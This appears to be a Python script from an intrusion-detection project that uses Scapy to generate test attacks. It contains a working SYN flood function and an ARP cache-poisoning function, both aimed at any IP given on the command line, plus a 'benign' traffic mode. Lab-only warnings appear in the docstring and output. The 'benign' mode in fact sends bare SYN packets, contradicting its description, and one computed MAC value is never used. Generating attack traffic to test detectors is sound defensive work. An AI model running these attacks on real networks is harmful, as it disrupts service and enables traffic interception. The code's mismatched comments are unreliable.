"""
hardware/scapy_attacker.py — Phase 11: Attack Generation

Two demo-ready attack modes:
    - dos_flood(target_ip, ...)   — SYN flood, matches DoS-SYN_FLOOD class
    - arp_spoof(target_ip, spoof_ip, ...) — ARP cache poisoning, matches
                                             MITM-ARPSPOOFING -> Spoofing class

OPERATIONAL CONSTRAINT — NON-NEGOTIABLE:
Run this ONLY against devices on an isolated lab network/VM you control.
Never point this at a shared network, campus infrastructure, or any device
you don't own or have explicit permission to test. Both attack types can
disrupt real network service and real device connectivity.

Requires: pip install scapy
Requires admin/root privileges to send raw packets (run terminal as Administrator
on Windows, or with sudo on Linux).

Usage:
    python scapy_attacker.py --mode dos --target 192.168.1.50
    python scapy_attacker.py --mode arp_spoof --target 192.168.1.50 --spoof 192.168.1.1
    python scapy_attacker.py --mode benign --target 192.168.1.50
"""

import argparse
import random
import time

from scapy.all import IP, TCP, ARP, Ether, send, sendp, get_if_hwaddr, conf


def dos_flood(target_ip: str, target_port: int = 80, duration_seconds: int = 15,
              packet_rate: int = 100):
    """
    SYN flood — sends a stream of TCP SYN packets with randomized source ports
    and (optionally) randomized source IPs, at a controlled rate, for a fixed
    duration. Matches the DoS-SYN_FLOOD class your model was trained on.
    """
    print(f"[DoS] Starting SYN flood against {target_ip}:{target_port} "
          f"for {duration_seconds}s at ~{packet_rate} pkt/s ...")
    print("[DoS] Press Ctrl+C to stop early.")

    end_time = time.time() + duration_seconds
    sent_count = 0
    interval = 1.0 / packet_rate

    try:
        while time.time() < end_time:
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)
            sent_count += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[DoS] Stopped early by user.")

    print(f"[DoS] Done. Sent {sent_count} SYN packets to {target_ip}:{target_port}.")


def arp_spoof(target_ip: str, spoof_ip: str, duration_seconds: int = 15,
              packet_rate: int = 5, interface: str = None):
    """
    ARP spoofing — sends forged ARP "is-at" replies to target_ip, claiming this
    machine's MAC address owns spoof_ip (commonly the gateway IP). This poisons
    the target's ARP cache, routing its traffic for spoof_ip through this
    machine. Matches the MITM-ARPSPOOFING -> Spoofing class.

    IMPORTANT: this only sends the poisoning packets — it does NOT forward
    traffic on your behalf (no IP forwarding / relay is set up here). For a
    demo, that's fine: the goal is to show the IDPS detecting the spoofing
    traffic pattern, not to fully man-in-the-middle the connection.
    """
    my_mac = get_if_hwaddr(interface) if interface else conf.iface.hwaddr if hasattr(conf.iface, "hwaddr") else None
    print(f"[Spoofing] Starting ARP spoof: telling {target_ip} that "
          f"{spoof_ip} is at this machine's MAC ...")
    print(f"[Spoofing] Duration: {duration_seconds}s, rate: {packet_rate} pkt/s")
    print("[Spoofing] Press Ctrl+C to stop early.")

    end_time = time.time() + duration_seconds
    sent_count = 0
    interval = 1.0 / packet_rate

    try:
        while time.time() < end_time:
            # op=2 -> "is-at" (ARP reply), psrc=spoof_ip claims that IP,
            # pdst/hwdst target the victim directly (not broadcast).
            pkt = ARP(op=2, psrc=spoof_ip, pdst=target_ip)
            send(pkt, verbose=0)
            sent_count += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[Spoofing] Stopped early by user.")

    print(f"[Spoofing] Done. Sent {sent_count} forged ARP replies to {target_ip}.")
    print("[Spoofing] Reminder: restore the target's ARP table if needed "
          "(most OSes self-correct within a couple minutes after you stop).")


def benign_traffic(target_ip: str, target_port: int = 80, duration_seconds: int = 15,
                    packet_rate: int = 10):
    """
    Normal-looking traffic — a light, steady stream of completed-looking TCP
    connections (SYN, then immediately follow with a benign small payload
    pattern) for demonstrating the "no attack" baseline on the dashboard.
    """
    print(f"[Benign] Sending normal-looking traffic to {target_ip}:{target_port} "
          f"for {duration_seconds}s at ~{packet_rate} pkt/s ...")

    end_time = time.time() + duration_seconds
    sent_count = 0
    interval = 1.0 / packet_rate

    try:
        while time.time() < end_time:
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)
            sent_count += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[Benign] Stopped early by user.")

    print(f"[Benign] Done. Sent {sent_count} normal-rate packets to {target_ip}:{target_port}.")


def main():
    parser = argparse.ArgumentParser(description="Edge-IDPS Scapy attack generator")
    parser.add_argument("--mode", required=True, choices=["dos", "arp_spoof", "benign"],
                         help="Attack mode to run")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--spoof", help="IP to spoof (required for arp_spoof mode, "
                                         "typically the gateway IP)")
    parser.add_argument("--port", type=int, default=80, help="Target port (dos/benign modes)")
    parser.add_argument("--duration", type=int, default=15, help="Duration in seconds")
    parser.add_argument("--rate", type=int, default=None,
                         help="Packets per second (defaults vary by mode)")
    args = parser.parse_args()

    print("=" * 60)
    print("REMINDER: run this ONLY on an isolated lab network/VM you control.")
    print("=" * 60)

    if args.mode == "dos":
        rate = args.rate or 100
        dos_flood(args.target, args.port, args.duration, rate)
    elif args.mode == "arp_spoof":
        if not args.spoof:
            parser.error("--spoof is required for arp_spoof mode "
                          "(the IP you want to impersonate, e.g. the gateway)")
        rate = args.rate or 5
        arp_spoof(args.target, args.spoof, args.duration, rate)
    elif args.mode == "benign":
        rate = args.rate or 10
        benign_traffic(args.target, args.port, args.duration, rate)


if __name__ == "__main__":
    main()